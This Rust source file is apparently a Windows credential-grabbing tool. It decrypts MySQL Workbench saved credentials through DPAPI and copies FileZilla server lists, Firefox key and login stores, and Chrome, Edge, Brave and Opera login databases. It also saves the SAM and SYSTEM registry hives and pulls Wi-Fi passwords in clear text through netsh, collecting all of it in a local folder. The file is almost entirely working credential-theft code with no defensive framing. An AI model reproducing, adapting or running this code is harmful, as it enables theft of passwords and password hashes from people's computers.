use std::env;
use std::fs;
use std::path::Path;
use std::process::Command;
use std::ptr;
use std::string::String;
use lazy_static::lazy_static;
use winapi::um::wincrypt::CRYPTOAPI_BLOB;
use winapi::um::dpapi;


lazy_static! {
    static ref USER_PROFILE: String = {
        match env::var("userprofile") {
            Ok(up) => up,
            Err(e) => panic!("{}",e)
        }
    };
}


fn main() -> std::io::Result<()> {

    // Reset captured files folder
    if Path::new("grabby_files").exists(){
        let _ = fs::remove_dir_all("grabby_files");
    }
    fs::create_dir("grabby_files")?;
    fs::create_dir("grabby_files/mysqlworkbench")?;
    fs::create_dir("grabby_files/filezilla")?;
    fs::create_dir("grabby_files/firefox")?;
    fs::create_dir("grabby_files/chrome")?;
    fs::create_dir("grabby_files/edge")?;
    fs::create_dir("grabby_files/brave")?;
    fs::create_dir("grabby_files/opera")?;
    fs::create_dir("grabby_files/windows")?;
    fs::create_dir("grabby_files/wifi")?;


    // MySQL Workbench
    mysqlworkbench_export();

    // Filezilla
    filezilla_export();

    // Firefox
    firefox_export();

    // Chrome
    // https://github.com/alient12/decrypt-chrome-passwords/blob/main/decrypt_chrome_password.py
    chrome_export("Google\\Chrome");
        
    // Edge
    chrome_export("Microsoft\\Edge");

    // Brave
    chrome_export("BraveSoftware\\Brave-Browser");

    // Opera
    chrome_export("Opera Software\\Opera Stable");
        
    // Windows
    windows_export();
        
    // Wifi
    wifi_export();
    
    Ok(())
}


fn mysqlworkbench_export() {

    let myworkbench_user_data_file = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Roaming\\MySQL\\Workbench\\workbench_user_data.dat");

    if Path::new(&myworkbench_user_data_file).exists(){

        let mut myworkbench_user_data: Vec<u8> = fs::read(myworkbench_user_data_file).unwrap();
        let bytes: u32 = myworkbench_user_data.len().try_into().unwrap();
        let mut blob = CRYPTOAPI_BLOB{cbData: bytes, pbData: myworkbench_user_data.as_mut_ptr()};
        let mut new_blob = CRYPTOAPI_BLOB{cbData: 0, pbData: ptr::null_mut()};

        unsafe {

            let res = dpapi::CryptUnprotectData(&mut blob, ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), 0, &mut new_blob);
            if res != 0 {

                let cb_data = new_blob.cbData.try_into().unwrap();
                let vec = Vec::from_raw_parts(new_blob.pbData, cb_data, cb_data);

                let myworkbench_user_data = String::from_utf8(vec).unwrap();
                fs::write("grabby_files/mysqlworkbench/workbench_user_data.txt", myworkbench_user_data).expect("err");
            }
        }
    }
}

fn filezilla_export() {

    let sitemanager = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Roaming\\FileZilla\\sitemanager.xml");
    let recentservers = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Roaming\\FileZilla\\recentservers.xml");
    if Path::new(&sitemanager).exists() && Path::new(&recentservers).exists(){

        fs::copy(sitemanager, "grabby_files/filezilla/sitemanager.xml").expect("err");
        fs::copy(recentservers, "grabby_files/filezilla/recentservers.xml").expect("err");
    }
}

fn firefox_export() {

    let key4 = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\qatbpi71.default-release\\key4.db");
    let logins = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\qatbpi71.default-release\\logins.json");
    if Path::new(&key4).exists() && Path::new(&logins).exists() {

        fs::copy(key4, "grabby_files/firefox/key4.db").expect("err");
        fs::copy(logins, "grabby_files/firefox/logins.json").expect("err");
    }
}

fn chrome_export(browser_path: &str) {

    let local_state = format!("{}\\AppData\\Local\\{}\\User Data\\Local State", USER_PROFILE.to_string(), browser_path);
    let login_data = format!("{}\\AppData\\Local\\{}\\User Data\\Default\\Login Data", USER_PROFILE.to_string(), browser_path);
    if Path::new(&local_state).exists() && Path::new(&login_data).exists() {
        
        fs::copy(local_state, "grabby_files/chrome/Local State").expect("err");
        fs::copy(login_data, "grabby_files/chrome/Login Data").expect("err");
    }
}

fn windows_export() {

    Command::new("reg")
        .arg("save")
        .arg("hklm\\sam")
        .arg("grabby_files\\windows\\sam")
        .output()
        .expect("err");

    Command::new("reg")
        .arg("save")
        .arg("hklm\\system")
        .arg("grabby_files\\windows\\system")
        .output()
        .expect("err");
}

fn wifi_export() {

    let mut wifi_logins: String = "SSID\tPassword".to_owned();

    let resp = String::from_utf8(
        Command::new("netsh")
        .arg("wlan")
        .arg("show")
        .arg("profile")
        .output().expect("err").stdout)
        .unwrap();

    for line in resp.split("\r\n") {
        
        if line.contains(": ") {

            let ssid = line.split(": ").nth(1).unwrap().replace("\t", "");

            let resp2 = String::from_utf8(
                Command::new("netsh")
                .arg("wlan")
                .arg("show")
                .arg("profiles")
                .arg(ssid.clone())
                .arg("key=clear")
                .output().expect("err").stdout)
                .unwrap();

            for line2 in resp2.split("\r\n") {
                if line2.contains("Key Content") {
                    let password = line2.split(": ").nth(1).unwrap().replace("\t", "");
                    wifi_logins = format!("{}\n{}\t{}", wifi_logins, ssid, password);
                }
            }
        }
    }
    fs::write("grabby_files/wifi/logins.tsv", wifi_logins).expect("err");
}
